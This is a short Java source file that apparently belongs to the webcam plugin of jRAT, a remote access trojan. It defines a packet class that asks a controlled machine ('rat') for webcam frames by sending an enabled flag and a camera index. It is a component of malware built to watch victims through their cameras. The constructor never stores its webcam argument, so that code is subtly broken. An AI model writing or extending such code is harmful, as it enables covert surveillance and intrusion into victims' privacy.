package se.jrat.plugin.webcam.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.Client;
import jrat.api.net.PacketBuilder;

public class OutgoingPacket120Webcam extends PacketBuilder {

	private int webcam;
	
	public OutgoingPacket120Webcam(Client rat, int webcam) {
		super(WebcamPlugin.HEADER_WEBCAM_FRAME, rat);
	}

	@Override
	public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		dos.writeBoolean(WebcamPlugin.enabled);
		dos.writeInt(webcam);
	}

}
